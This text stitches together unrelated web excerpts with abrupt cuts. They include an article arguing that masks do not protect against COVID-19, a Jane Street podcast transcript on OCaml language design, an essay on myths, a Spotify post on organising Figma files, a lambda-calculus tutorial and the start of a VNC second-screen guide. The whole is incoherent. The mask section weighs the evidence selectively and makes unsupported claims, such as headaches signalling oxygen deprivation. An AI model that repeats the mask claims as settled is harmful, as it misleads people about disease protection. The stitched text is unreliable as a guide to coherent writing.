Of the seven papers, five studied only health-care workers, and this article does not question whether health care workers should wear masks. This leaves only two papers. One provided no socio-economic or health data on the case versus control groups, leaving open the possibility that there were significant differences. The last study confirmed this, the cases (who had been diagnosed with ‘probable’ SARS, i.e. without a SARS test) were significantly sicker before SARS than the controls, which makes sense because people who were diagnosed with SARS tended to have pre-existing health conditions, just as is found with COVID-19. Mask wearing and hand washing were more common in controls, resulting in the conclusion that they were protective. But attending farmer’s markets was also ‘protective’. In reality this probably just reflects the better health of the control group. Really sick people may avoid the use of masks because it interferes with their breathing when they already have problems. This possibility was not considered by either paper.
</p><p>
So, in conclusion there are two papers in this review that claimed that wearing masks was protective against SARS, but one admits that the control group was significantly healthier than the case group, and the other paper is silent on this important source of bias.

</blockquote>

<p>
There are also the hamsters, however. No, Hong Kong University did not find a source of hamster sized surgical masks, but in an unpublished paper, they describe putting a surgical mask over the air flow between a cage of RNA positive hamsters and a cage of RNA negative hamsters, and documenting that a higher proportion of the RNA-negative hamsters became RNA-positive when there was no mask over the airflow. It is not clear why the researchers believe their studies can be extrapolated directly to people. Although newspaper articles claim that the paper has been released, not even the Hong Kong University press release, the institution where the work was performed, provided any details about its location.

</blockquote>
<p>
More recently a paper in Lancet identified 172 observational studies (not randomized trials) that they claimed supported social distancing or mask wearing. Of the 44 they examined in detail, 35 studied health care workers, 8 studied close contacts (e.g. a household with an ill person, traced contacts of a person with a positive test) and only 3 studied public spaces (one studied all three, hence the numeric discrepancy). Of those 3 papers one studied distance versus infection risk on airplanes, and another was included in the Cochrane study, above. The third paper, as yet not peer-reviewed and published, was focussed on contact tracing, but did note that of two couples discovered to be both positive through contact tracing (out of 404 close contacts of 9 COVID-19 cases), one took a lot of precautions (mask, separate bedroom, separate bathroom) while the other did not, lending no clarity to the mask debate.

<p>
A heavily promoted <a href="https://www.acpjournals.org/doi/10.7326/M20-2567">paper in the Annals of Internal Medicine</a> (Ads on Twitter paid for by McMaster University in Canada) claims in the title that “Cloth Masks May Prevent Transmission of COVID-19”. They admit that, “cloth does not stop isolated virions”, but claim that since virus particles are always attached to droplets, that research on transmission of bacteria can be useful. Many of the masks tested in experiments they referenced had 3 to 6 layers of cloth. They also admit that the only randomized trial (discussed below) showed that cloth masks increased influenza-like illnesses in health care workers who wore them for long periods of time. They ignore the Korean research (also discussed below) that concluded that, “Neither surgical nor cotton masks effectively filtered SARSâ€“CoV-2 during coughs by infected patients”. Finally they conclude their promotion of cotton masks by admitting that, “Whether wearing a mask of any sort in a community context protects oneself or others is unknown”. Maybe this paper should be in a section of its own, “Papers that want masks to work but cannot prove it”.

</blockquote>

<h2>Evidence against the use of Masks</h2>
<p>
A very recent review of the literature that was published in the CDC journal, “Emerging Infectious Diseases” did not find evidence that handwashing or masks were protective against influenza. Masks did not help infected people reduce their risk of infecting others, nor reduce the risk of uninfected people contracting influenza.
<br>
</p><blockquote>
“In this review, we did not find evidence to support a protective effect of personal protective measures or environmental measures in reducing influenza transmission…Hand hygiene is a widely used intervention and has been shown to effectively reduce the transmission of gastrointestinal infections and respiratory infections. However, in our systematic review, updating the findings of Wong et al., we did not find evidence of a major effect of hand hygiene on laboratory-confirmed influenza virus transmission...We did not find evidence that surgical-type face masks are effective in reducing laboratory-confirmed influenza transmission, either when worn by infected persons (source control) or by persons in the general community to reduce their susceptibility...It is essential to note that the mechanisms of person-to-person transmission in the community have not been fully determined. Controversy remains over the role of transmission through fine-particle aerosols.”

<p>
A Korean study put masks on COVID-19 infected people and did not reduce the transmission of viral RNA when patients coughed with a mask on.

<h2>Adverse Consequences of Masks</h2>
<p>
Adverse consequences of masks are most obvious among health-care workers, where use is more controlled, but members of the general public who voluntarily wear masks for extended periods of time may experience similar problems.
</p><p>
A study in BMJ showed that people who were told to wear cloth masks for extended period of time (for purposes of this study) had higher rates of influenza-like illness than other health care workers but could decide if and when to wear masks, and higher rates than those wearing surgical masks. Even among health care workers, mask wearing could be counter-productive.
<br>
</p><blockquote>
“The rates of all infection outcomes were highest in the cloth mask arm, with the rate of ILI [influenza-like illness] statistically significantly higher in the cloth mask arm (relative risk (RR)=13.00, 95% CI 1.69 to 100.07) compared with the medical mask arm. Cloth masks also had significantly higher rates of ILI compared with the control arm [workers who followed standard practice, which could sometimes include mask wearing]. An analysis by mask use showed ILI (RR=6.64, 95% CI 1.45 to 28.65) and laboratory-confirmed virus (RR=1.72, 95% CI 1.01 to 2.94) were significantly higher in the cloth masks group compared with the medical masks group. Penetration of cloth masks by particles was almost 97% and medical masks 44%.”

</blockquote>

<p>A study from Singapore found an increased risk of headaches, indicative of oxygen deprivation, among health care workers. This may or may not apply to the general public who generally wear masks that are less tight fitting (and therefore less effective).
</p><blockquote>
“A total of 158 healthcare workers participated in the study. Majority [126/158 (77.8%)] were aged 21-35 years. Participants included nurses [102/158 (64.6%)], doctors [51/158 (32.3%)], and paramedical staff [5/158 (3.2%)]. Pre-existing primary headache diagnosis was present in about a third [46/158 (29.1%)] of respondents. Those based at the emergency department had higher average daily duration of combined PPE exposure compared to those working in isolation wards [7.0 vs 5.2 hours] or medical ICU …</blockquote></div>

		<h2 id="000000">00:00:00</h2>

<div><p>Welcome to Signals And Threads, in-depth conversations about every layer of the tech stack from Jane Street. I’m Ron Minsky. </p><p> Today, we’re going to have a conversation about programming language design with Leo White. Leo works in our compilers team here at Jane Street, and he works mostly on what’s called the frontend of the compiler, which means he spends a lot of time thinking about language features and about the type system that supports those language features, and in particular, he does that work in OCaml, which is the programming language we use on a day-to-day basis. </p><p> So, Leo, to get started, I’m curious, can you tell us a little bit about how you got involved in all of this? How you got involved in programming language design, in the first place?</p></div>

<h2 id="0000400">00:00:40.0</h2>

<div><p>I had some interest in programming languages from a young age. I started programming at 11 or something, and then I think I was fairly interested in how these mysterious things were created. The most formative thing I can think of in this regard, is between my first and second years at university, I remember reading Benjamin Pierce’s <a href="https://www.cis.upenn.edu/~bcpierce/tapl/"><em>Types and Programming Languages</em></a>. That really clicked. I just thought that stuff was great and I just really wanted work on it, and explore those ideas. </p><p> So, I think that’s kind of one of the main things that got me into it. I knew I wanted to do some programming language stuff, I started doing a PhD in that area. It was more about compilation than programming language design, and I was working on a source-to-source C compiler, and I was writing that compiler in OCaml, because OCaml had a good library for reading C files, and I already knew Standard ML, because it’s what they teach you in the first year at Cambridge. So, anyways, I was using OCaml to write this compiler, and I realized that there was a language feature that I wanted to have that would make it easier for me to write this C compiler, and since I kind of hated the work I was doing on the C compiler and was not that interested in it, I procrastinated by adding this feature to OCaml instead. And that’s kind of how I got into writing code for the OCaml compiler. So, I was writing, this language feature and went through the process of trying to upstream it, and whilst I was doing that and my PhD was coming to an end, Anil Madhavapeddy was looking around for people to join OCaml Labs, which was this new project to work on the OCaml compiler that Jane Street was kind of funding in Cambridge. So, he was trying to look for people to work on the OCaml compiler and suddenly this Cambridge address shows up with the implementing language features for OCaml and so he thought, well, I should go and see this person. So, he got in touch with me. And that’s kind of how I started working at OCaml Labs as an RA after having finished my PhD.</p></div>

<h2 id="0002195">00:02:19.5</h2>

<p>It’s by the way worth noting that most people have the wisdom to not immediately go and dive into adding features to languages that they’re just starting to use, and in particular, diving into the type system. I think when Anil saw someone who was willing to just going in and add a new type system feature, he was pretty excited.</p>

<h2 id="0002346">00:02:34.6</h2>

<p>Yes. I did not realize at the time that this wasn’t something that you just did. Yes, I was somewhat under-supervised in my PhD and clearly, no one told me that this is a terrible idea, and a bad way to spend your time. So, I just went ahead and did it instead, and I really enjoyed it. I mean, it’s quite a terrible…like, the type system is hard to dive into. I would not recommend doing it without some assistance.</p>

<h2 id="0002568">00:02:56.8</h2>

<p>The thing you mentioned about how you got involved in OCaml, is the thing that’s always worried me a little bit about how languages are designed, which is to say, languages are almost inevitably designed by people who write compilers, and so, they go around and look at the features they would like for writing compilers and go ahead and add them to the language, and I always wondered, like, how much of a bias is this in how our languages are designed?</p>

<h2 id="0003178">00:03:17.8</h2>

<p>I would say, not much of one mostly, because that is probably a fair accusation of OCaml, which is very nice for writing compilers and has all the things you would want for writing a compiler, but that is not true of most languages. Most languages are kind of horrible to write compilers in, so I don’t think it’s applying there.</p>

<h2 id="0003327">00:03:32.7</h2>

<p>So, you got excited about programming language design from reading <em>Types and Programming Languages</em>, which is Benjamin Pierce’s extremely famous book in this area, or at least extremely famous in an extremely narrow group of people, and you’ve been doing it now for quite a while. Some of that work during your PhD. Some at OCaml Labs, and a bunch of it here, in the intermediate time. What do you find exciting about language design? Why do you like it?</p>

<h2 id="0003550">00:03:55.0</h2>

<p>One of the main things I think I like about language design is that it sits at an interesting intersection between some very interesting pure mathematics, especially on the type system design side of things, and a more aesthetic, kind of, design style. A lot of it is about trying to find things that fit within the mathematical constraints, but are also a design that people like aesthetically and enjoy using.</p>

<h2 id="0004166">00:04:16.6</h2>

<p>And this is one of the real challenges of programming language design. It is really not, at its heart, a scientific enterprise, or at least, not at the end. This is a thing you often hear programming language people complain about, is the fact that they can’t do any proper studies, or rather, whether they can or can’t do it, that in practice, that is not how the field is driven.</p>

<h2 id="0004365">00:04:36.5</h2>

<p>Some people do try and do studies in how effective a programming language is, but it kind of hits up against all the things that make it hard to do experiments in the social sciences. It’s just seems like, in principle, you can manage it, but the experiments are just very hard to do, right? What you really need to do is get a load of professional programmers to agree to use all these different languages to solve the same problems for a prolonged period of time, and clearly this isn’t going to happen.</p>

<h2 id="0004566">00:04:56.6</h2>

<p>Yeah, it does seem completely and utterly hopeless to me because, if the things you care about are what you can do in a programming language, with large groups of people, solving hard problems, with significant amounts of time being devoted to it, which seems like, to me, at least, the interesting problem, and I think, a problem that a lot of programming languages are not even motivated by, you just have no hope. Like the kind of experiments people can run in practice, are like, they grab the thing they have at hand, which is usually a collection of sophomores, and then they study the thing that they can, which is something like how easy is it to understand the very first errors they see in their language or like, how well do they do when they try and do stuff in their first few weeks or maybe few months of working at it. And that just doesn’t get at the actual thing you care about when you think about what makes programming effective in the real world.</p>

<h2 id="0005434">00:05:43.4</h2>

<div><p>This kind of genuinely bothers quite a lot of people, I think, who work in programming languages. They really would much prefer that it were a proper science. It’s much better thought of as a kind of intersection between some mathematics and design. </p><p> And those are both things that we know how to study, right? The scientific method is not the only approach to knowledge. With mathematics, you can try to prove useful theorems and interesting properties, and people successfully do research in design disciplines like, my favorite example is really architecture, which I think is a very similar area to programming language design, in that it’s kind of constrained by mathematics. You know, you have to make sure the building stays up and also, is interesting from a design perspective. You know, you want to make buildings that people enjoy being in and looking at, and so on.</p></div>

<h2 id="0006249">00:06:24.9</h2>

<p>And there’s more than just the raw structural things you have to check. When you think about the design of a building, you think about what are transit times, and people do all sorts of studies to try get feels for how effective it is, but in the end, no one thinks that the final way to figure out whether a building is good is to do a randomized control trial, where you’re like, you make four different buildings and you have this, this and this. You have four equivalent businesses that you sit in the four different buildings and you see how it goes. And I think the scale of the economic investment required, I’m not sure if it’s not quite as absurd or a little more absurd to do the programming language equivalent, but it’s up there.</p>

<h2 id="0007013">00:07:01.3</h2>

<p>I think that that’s a better way of looking at programming language design, as a discipline.</p>

<h2 id="0007068">00:07:06.8</h2>

<p>You know, there are two ways of handling design problems. One is, you can solve them in the market, right? You can, you know, go off and have people go and design programming languages and see which are successful, and we have that down. There’s a whole system for doing that. And then there’s an academic equivalent of this, and a lot of the work on OCaml, in particular, happens in a context which includes a lot of academic staff. Do you have a feel for how you would make things like evaluation of papers different than it is now in order to accommodate for this?</p>

<h2 id="0007335">00:07:33.5</h2>

<div><p>I don’t have concrete suggestions. I’ve always wanted to, actually seriously, look into disciplines like architecture and so on, and look at how they, I mean they have journals. They have assessment of things. There must be mechanisms by which they do this, but I’ve never actually sat down and put serious time into seeing what that is. </p><p> I’m kind of more struck by the fact that when you’re at, say ICFP, which is the main functional …</p></div></div></div>

<p>Good stories develop their meaning across many levels. To summarize them into statements is to void them of their images, metaphors, allegories. The meanings and knowledge are not in the summary, but in the art itself. Knowledge is gained as those works of art <em>work</em> upon us. [...]</p><p>Without an education of stories, it is not only difficult to build your intuition, it is difficult to learn how to learn, and difficult to reason about virtue. Fairy tales and Bildungsroman stories work so well because maturity is almost impossible to transmit rationally, but is a very compelling concept aesthetically. It is learned by seeing others grow the courage to make meaningful decisions, and accept the duty and power and consequences that flow from them. It teaches a mastery that cannot simply be taught through abstract school lessons. [...]</p><p>A mythological education is distinct from the common school subjects. It builds in the mind intuition for second-order effects, for the first lesson a child learns from one hundred stories is that every thing you do will have unintended consequences, something years of schoolwork fails to teach. Myths give us shared art and common culture — a set of characters with which we can play in and enjoy together. In any culture rich with myths, their vocabulary is enlarged far beyond words, to allegories and metaphors.</p>

October 23, 2020 | https://spotify.design/article/how-spotify-organises-work-in-figma-to-improve-collaboration | <a href="https://web.archive.org/web/*/https://spotify.design/article/how-spotify-organises-work-in-figma-to-improve-collaboration">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Spotify Design recently migrated to Figma. We're excited to open up the music box and describe how we've shaped the tool to suit our needs and culture at Spotify. But in this article, we're not discussing why or how we moved. Instead, this is where we're going to geek out over file structures.</p><div><p>Check out our Figma Ways of Working above, and have a read of this article to understand some of the rationale behind it. We hope this information will be useful for other design teams seeking more organisation for their work in Figma.</p><h3>Defining our goal</h3><p>At Spotify Design, we actively encourage everyone to explore problems together, get inspired by one another and find harmony across design solutions. So as we were planning the migration, we set a goal to boost this effort and guide us through the whole process: <strong>organise our work in ways that improve collaboration between designers.</strong> New tools such as Abstract and Figma offer the ability to work together like never before, but allowing multiple people into the same file doesn’t automatically lead to better collaboration. Our files would need to be organised in a way that is visible and discoverable by everyone. After all, you can’t collaborate on work that you can’t find.</p><p>This is especially true in organisations like Spotify. Our squad model is optimised for autonomy, which is beneficial for many reasons but can result in designers working in isolation. Not only are we spread out amongst cross-functional squads, but we’re also spread across multiple product areas—which we call “business units”—and numerous offices around the world.</p><h3>New process, new challenges&nbsp;</h3><p>In our pursuit of greater visibility of work, we needed to be mindful of how we impacted speed and effort—two important factors in a designer’s workflow. Increasing visibility can be detrimental as it introduces more people, more structure, more rules, and more thinking to simple tasks. Our decisions could easily increase the effort required to keep work organised or make it slower to navigate to files, potentially resulting in fewer sketches, prototypes, and iterations. The challenge was to balance our need for both visibility and speed.</p></div><div><p>Previous attempts at storing our design files helped us understand how the migration might play out if we weren’t thoughtful enough. Some of the things we anticipated when designing the Figma workflow were:</p><ul><li><p><strong>People naturally optimise for speed</strong>, creating personal workflows and carving out private spaces for themselves or their squad. While standards can improve speed in the long run, individual workflows seem more immediately beneficial.&nbsp;</p></li><li><p><strong>People interpret structure in their own way</strong> using various mental models—teams, products, projects, people—and standards rarely develop organically. Guidelines have to be clear and intuitive to break through individual instincts.&nbsp;</p></li><li><p>While some people iterate on features and document specs within the same file, others separate them into different documents. <strong>Seemingly small decisions flow into processes with engineers and PMs and define their understanding of how to find work</strong>.</p></li></ul><p>We had to take every detail of these behaviours into consideration before moving forward.</p><h3>Ways of working&nbsp;</h3><p>So we had a goal, and we knew the challenges that lay ahead, but how did we tackle the problem? Design Ops used our <a href="https://spotify.design/articles/2019-10-17/dialling-up-the-joy-turning-down-the-pain-design-ops-at-spotify/" rel="noopener noreferrer" target="_blank"><u>trusted working group (WG) model</u></a> and pulled together a crew of designers from across Spotify that were able to represent the design teams in their business units.</p><p>To start, the group defined a set of principles that reflected our objectives and would guide our ideas:</p><ul><li><p><strong>Unifying:</strong> People should be organically exposed to other relevant work, regardless of where they sit in the org.</p></li><li><p><strong>Discoverable: </strong>Work should have a clear home. There should be no lingo, no hunting for files, and no getting lost.</p></li><li><p><strong>Manageable:</strong> Spaces shouldn’t become so busy that files aren’t easy to organise and access.</p></li><li><p><strong>Sustainable:</strong> The number of teams and projects shouldn’t grow to an untenable size, become irrelevant, or need to be frequently changed.</p></li><li><p><strong>Autonomous:</strong> Each team should be empowered to diverge from our recommendations, acknowledging that one solution may not work for everyone.</p></li></ul><p>From there, we explored a spectrum of options that aimed to balance visibility and speed. Some increased the size of spaces where more people would work alongside each other, while others narrowed them down to smaller definitions with just a couple of designers working side-by-side. With a set of options, a stack of printouts, and even Figma prototypes, we conducted rounds of research with designers in our business units. Yes, we got <i>that </i>nerdy. We had file structure design workshops!&nbsp;</p><p>Here’s an example of some of the workshop material:</p></div><div><p>The workshops allowed us to identify the most common mental models, test the intuitiveness of our ideas and give everyone a voice. Perhaps most importantly, it gave the design team some empathy for the problem we were trying to solve. We can be passionate about our personal workflows (we use them every day!) so sharing the problem with the team helped them recognise how differently everyone can think about these things.</p><h3>The outcome</h3><p>This process led us to the following three key decisions:</p><ol><li><p><strong>Teams </strong>will be organised by the products we build.&nbsp;</p></li><li><p><strong>Projects</strong> will be organised by a product’s features or feature sets.&nbsp;</p></li><li><p><strong>Specs</strong> will be centralised inside a single project in each team. </p></li></ol></div><div><p>Organising <strong>Teams</strong> in this way communicates our expansive product suite at Spotify such as our mobile app, Spotify Kids, Ad Studio, Spotify for Artists, Anchor, and many other external and internal products. From our org overview you can immediately tell that design work from the whole company is right at your fingertips. The structure guides designers from different business units and squads to work together in the same space when designing for the same product, and it enables us to cleanly map our <a href="https://spotify.design/articles/2019-12-16/reimagining-design-systems-at-spotify/" rel="noopener noreferrer" target="_blank">Encore (design system)</a> libraries to each team.</p><p>These same attributes are reflected in the Team structure where a product's set of features are communicated through <strong>Projects</strong>. Emojis help us distinguish between specs, feature explorations, new initiatives, and a playground for quick ideas, and each Project is usually filled with work from only three or four designers so people still have a sense of their own, personal space.</p><p>Lastly, we took the opportunity to reconsider how and where we document our <strong>specs</strong>—the screens, states, and flows that represent our source of truth. Our decision didn’t immediately feel intuitive to the design team, but we held a strong conviction that its value would soon become apparent.</p></div><div><p>“Where’s the latest design?” is a message we send and receive far too often. Similar to how we’re bringing visibility to exploration work through our new Team and Project structures, we also wanted to pull specs out from individual files and into the open. Each Team (i.e. product) now has a single spec file, and within those files are pages that represent each of our features. As a designer hones in on a solution, they move their work into these centralised specs to document their decisions.&nbsp;</p><p>Like the software we ship, these specs constantly evolve as old screens replace new ones, and components update to take on new forms and functionality. It’s a representation that we are all working together towards a unified product, sharing patterns and solutions with each other. And there is no "looking at the wrong thing," because there is only one place to look.</p><h3>Where it all comes together&nbsp;</h3><p>Finally, the WG developed a <a href="https://www.figma.com/community/file/832911648132248625/Spotify-Ways-of-Working" rel="noopener noreferrer" target="_blank">playbook</a> and incorporated this into the training we hosted when we onboarded designers onto Figma. The WG needed to do some polite policing, regularly checking the tool to do some light housekeeping—checking on rogue teams (often with random squad names), pinging people on Slack when we saw diversions to the conventions, and hosting demos to show people how to set up things correctly. We created a #figma channel for designers to ask us questions and even added some external folk from the Figma product team.</p></div><div><p>We have now been using the new structure for three months and so far, so good. For the most part, designers have adhered to the system, and we have seen instances of teams across the organisation collaborating on products, rather than hiding their work inside their orgs. We believe this will have the impact we set out to achieve, and we’ll continue to iterate as we receive feedback and notice emerging trends.</p><p>If you're going through the process of creating your own organisation system, remember to use your design team’s superpowers to help guide your structure—research how your own team works, test ideas with designers, and prototype solutions before agreeing on a structure that works for your team culture.&nbsp;</p><p>—

    <p>I have recently become very interested in functional programming - using pure functional languages such as Haskell, as well as functional programming in JavaScript. One of the main areas of study that is often cited as significant for functional programmers is <strong>lambda calculus</strong>.</p>

<p>In this article I want to look at what lambda calculus is, why you might want to learn about it, and explain the key concepts and the terminology of lambda calculus using both lambda syntax and ‘equivalent’ JavaScript code snippets.</p>

<p>If after reading this you are interested in learning more about functional programming in JavaScript, I recommend this Udemy course (affiliate link):</p>

<p><a href="https://click.linksynergy.com/link?id=5FPU6FRy5w4&amp;offerid=507388.1537962&amp;type=2&amp;murl=https%3A%2F%2Fwww.udemy.com%2Fcourse%2Ffunctional-programming-for-beginners-with-javascript%2F">Functional Programming For Beginners With JavaScript</a></p>



<p>There are a few reasons to learn lambda calculus, the main ones I can think of are:</p>

<ol>
  <li>
    <p><strong>It embodies some of the most important concepts of functional programming</strong></p>

    <p>For example, pure functions, unary functions, currying.</p>
  </li>
  <li>
    <p><strong>The internals of many functional programming languages such as Haskell, are heavily based on lambda calculus</strong></p>

    <p>Understanding lambda calculus will help you to understand these languages.</p>
  </li>
  <li>
    <p><strong>Many concepts from lambda calculus are applicable to general purpose languages such as JavaScript.</strong></p>

    <p>Concepts such as pure functions, unary functions and currying are used in many general purpose programming languages, and are often used in functional JavaScript.</p>
  </li>
  <li>
    <p><strong>It is interesting</strong></p>

    <p>Lambda calculus is an interesting area of mathematics, and is relatively accessible to those with a minimal maths background.</p>
  </li>
</ol>



<p>Lambda calculus was invented by the mathematician <a href="https://en.wikipedia.org/wiki/Alonzo_Church">Alonzo Church</a> in the 1930s, and is what is known as a ‘computational model’. By that, I mean that it is a system which can be used to encode and compute algorithmic problems.</p>

<p>The computational model most of us are familiar with is the Turing machine. While lambda calculus is rather different to the Turing machine in its approach to computation, the two are formally equivalent - ie. any problem that can by solved using a Turing machine can be solved using lambda calculus, and vice versa.</p>

<p>That is to say, lambda calculus can be used to solve any problem that can be computed using a Turing machine (so anything that anyone has ever programmed with a computer)!</p>
<h2 id="lambda-calculus-basics">Lambda calculus basics</h2>

<p>Lambda calculus is very minimalistic in its rules/axioms. It is made up of just 3 basic components, or <strong>lambda terms</strong>:</p>

<ol>
  <li>
    <p><strong>Variable</strong> - a named token used in a function, which will be replaced by concrete arguments when the function is applied.</p>
  </li>
  <li>
    <p><strong>Abstraction</strong> - a function, made up of a head and a body separated by a ‘\(.\)’</p>

    <ul>
      <li>The head is a lambda followed by a variable name.</li>
      <li>The body is an expression.</li>
    </ul>
  </li>
  <li>
    <p><strong>Application</strong> - a function invokation.</p>
  </li>
</ol>

<p>An <strong>expression</strong> is a variable, an abstraction, an application, or any combination of these.</p>

<p>In addition, parentheses are used in lambda calculus to indicate the order of evaluation.</p>

<p>This is all we get in lambda calculus! It is quite amazing that using these 3 lambda terms we calculate pretty much anything!</p>

<p>It is worth noting the absence of any of the constructs of basic arithmetic, such as numbers, addition, subtraction, multiplication, division etc - these are not within the basic axioms of lambda calculus.</p>

<p>Numbers and arithmetic operations can be defined in terms of lambda calculus via <a href="https://en.wikipedia.org/wiki/Church_encoding">Church Encoding</a> (which is outside the scope of this article). Rather than working from first principles every time we need them, we can choose to use numbers and basic arithmetic operators for convenience.</p>

<h2 id="a-simple-example---the-identity-function">A simple example - the identity function</h2>

<p>The following function is known as the identity function, it takes a value and returns that same value.</p>

<p>In JavaScript we can easily define and execute this function:</p>

<pre><code>const identity = x =&gt; x;
identity(3) // 3
</code></pre>

<p>We can write the same function using lambda calculus as follows:</p><p>

\[\lambda x . x\]

</p><p>In the above:</p>
<ul>
  <li>\(x\) is a variable.</li>
  <li>
    <p>\(\lambda x . x\) is an abstraction.</p>

    <ul>
      <li>\(\lambda x\) is the head of the abstraction</li>
      <li>\(x\) is the body of the abstraction.</li>
    </ul>
  </li>
</ul>

<p>To perform an application, ie. apply the function to a concrete argument, we use the following syntax:</p><p>

\[(\lambda x . x) \ 3\]

\[[x := 3]\]

\[3\]

</p><p>In the above, the \([x := 3]\) syntax indicates that we are going to substitute all instances of \(x\) in the function with \(3\). The above process is known as beta reduction, which I will talk more about now.</p>

<h2 id="beta-reduction">Beta reduction</h2>

<p>In JavaScript when we invoke a (pure) function with its arguments, the function gets evaluated and it returns the evaluated result:</p>

<pre><code>const f = (x, y) =&gt; x(y);

f(z =&gt; z + 1, 3); // 4
</code></pre>

<p>Here, <code>f</code> takes 2 arguments - a function <code>x</code> and a value <code>y</code>, and calls <code>x</code> with <code>y</code> as an argument.</p>

<p>In lambda calculus, the process of applying concrete arguments to an abstraction, and reducing the resulting expression is known as <strong>beta reduction</strong>.</p>

<p>The equivalent to the above JavaScript function <code>f</code>, when written with lambda calculus, is:</p><p>

\[\lambda x y . x y\]

</p><p>This time, we have an application in the body of the abstraction: \(x y\), this means ‘call \(x\) with \(y\) as an argument’. We can pass arguments to the abstraction and beta reduce it as follows:</p><p>

\[(\lambda x y . x y) \ (\lambda z . z + 1) \ 3\]

\[[x := \lambda z . z + 1]\]

\[(\lambda y . (\lambda z . z + 1) \ y) \ 3\]

\[[z := y]\]

\[(\lambda y . y + 1) \ 3\]

\[[y := 3]\]

\[4\]

</p><p><strong>Beta normal form</strong> is the most simplified form of an expression, ie. when it cannot be beta reduced the terms in an expression any further. In the above example \(4\) is the beta normal form of the application.</p>

<h2 id="alpha-equivalence">Alpha Equivalence</h2>

<p>In JavaScript, renaming a function’s parameters has no effect on the behaviour of the function.</p>

<pre><code>// The following are equivalent.
const myFunc1 = (x, y) =&gt; x * x;
const myFunc2 = (y, x) =&gt; y * y;
</code></pre>

<p>Similarly, in lambda calculus renaming variables within a function also has no effect. We say that abstractions which differ only in their variable names are <strong>alpha equivalent</strong>.</p>

<p>The following is an example of 2 abstractions which are alpha equivalent:</p><p>

\[\lambda x y . xx\]

\[\lambda y x . yy\]

</p><h2 id="bound-and-free-variables">Bound and free variables</h2>

<p>In JavaScript, the return value of a function can be calculated us both its parameters, and variables which the function closes over:</p>

<pre><code>const z = 5;
// z, in the context of our function, is a free variable.
const f = (x, y) =&gt; z + (x * y);

f(2, 3); // 11 === z + 6
</code></pre>

<p>Similarly, lambda calculus abstractions can make use of both variables which are defined in the head of the abstraction, and other, ‘unknown’ variables which are not. In lambda calculus:</p>

<ul>
  <li><strong>Bound variables</strong> are variables used in an abstraction which appear in the head of the abstraction.</li>
  <li><strong>Free variables</strong> are variables used in an abstraction which do not appear in the head, their value is taken to be unknown within the context of the abstraction.</li>
</ul>

<p>If we express the JavaScript function defined above in lambda calculus, we get:</p><p>

\[\lambda x y . z + (x * y)\]

</p><p>And now applying arguments to this function and beta reducing it:</p><p>

\[(\lambda x y . z + (x * y)) \ 2 \ 3\]

\[[x := 2]\]

\[(\lambda y . z + (2 * y)) \ 3\]

\[[y := 3]\]

\[z + 6\]

</p><p>The notable difference here is that in our JavaScript function, we assigned a value to <code>z</code>, whereas in the lambda calculus, we just evaluated the function as far as we could without knowing \(z\).</p>

<p>Even though it is not a numerical result, \(z + 6\) is the beta normal form of this application.</p>

<h2 id="unary-functions-and-currying">Unary functions and currying</h2>

<p>Up until now we have been making a simplification, and viewing lambda functions as functions which take one or more arguments and return a single value.</p>

<p>This is <em>not actually correct</em>.</p>

<p>Every lambda function takes a single argument and returns a single result, and this type of function is know as a <strong>unary function</strong>.</p><p>

\[\lambda x y z . x * y * z\]

</p><p>Is actually shorthand for</p><p>

\[\lambda x . (\lambda y .  (\lambda z . x * y * z))\]

</p><p>This is function with a single parameter \(x\), which when invoked returns another function with a single parameter \(y\), which when invoked returns another function with a single parameter \(z\), which when invoked returns the value of \(x * y * z\)</p>

<p>In JavaScript, the above function looks like:</p>

<pre><code>const f = x =&gt; y =&gt; z =&gt; x * y * z;
</code></pre>

<p>If you have done any functional programming in JavaScript then this way of writing a function may look familiar. Taking a function which takes many arguments, and breaking it down into a series of unary functions (which each take a single argument) is known as <strong>currying</strong>.</p>

<p>We can invoke the above function either by passing all of its arguments and immediately obtaining the final result, or, we can first create a more specific function by passing only some arguments, and then call this function later to get the final result.</p>

<pre><code>// Call our function with 3 arguments.
f(2)(3)(4); // 24

// Call our function with 2 arguments to create a more specialised function.
const multiplyBySix = f(2)(3);

multiplyBySix(4); // 24
</code></pre>

<p>In JavaScript we have the choice to either use curried unary functions, or functions which take more than one argument.</p>

<p>In lambda calculus, all functions are curried unary functions, despite that fact that we often use the aforementioned shorthand which makes them appear as if they take multiple arguments.</p>



<p>Just as not all JavaScript function calls can be evaluated to produce a value, not all lambda functions reduce to a beta normal form upon application. Consider the following, somewhat contrived piece of JavaScript:</p>

<pre><code>const f = x =&gt; x(x);
f(f);
</code></pre>

<p>This is a little confusing. We define a function <code>f</code>, which takes a function <code>x</code> and calls it with itself as an argument. On the next line, we call <code>f</code> with itself, which will recursively continue to call f with itself, and mayhem ensues.</p>

<p>If you execute the above code, you will get a max call stack size exceeded error. Conceptually we can think of what happens as something like:</p>

<pre><code>f(f(f(f(f(f(...)))))); // and so on, until we reach the maximum call stack size.
</code></pre>

<p>In lambda …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>Dual screen workflows without screens across operating systems</p></blockquote><h2 id="background">Background</h2><p>My X380 sadly has been having port issues. This meant that my M14 was no longer a viable option for my second screen needs.</p><h2 id="outline">Outline</h2><p>The general form of the solution works in one of two ways:</p><dl><dt>VNC Viewer</dt><dd>Where the (second-screen) laptop connects to a VNC server on the primary laptop</dd><dt>Peripheral Shares</dt><dd>Where the secondary laptop runs a server to enable proxying mouse and keyboard access from the primary laptop</dd></dl><h2 id="vnc-and-windows">VNC and Windows</h2><p>For laptops running Windows, I personally just set up <a href="https://tightvnc.com/">TightVNC</a>. The standard settings work well enough for the peripheral share described below.</p><p>This is best used for working with Windows only stuff like Office.</p><h2 id="vnc-and-linux">VNC and Linux</h2><p>For the secondary laptop we need to run a server (<code>tigervnc</code>) without setting an external screen.</p><div><pre><code data-lang="bash">x0vncserver -rfbauth ~/.vnc/passwd
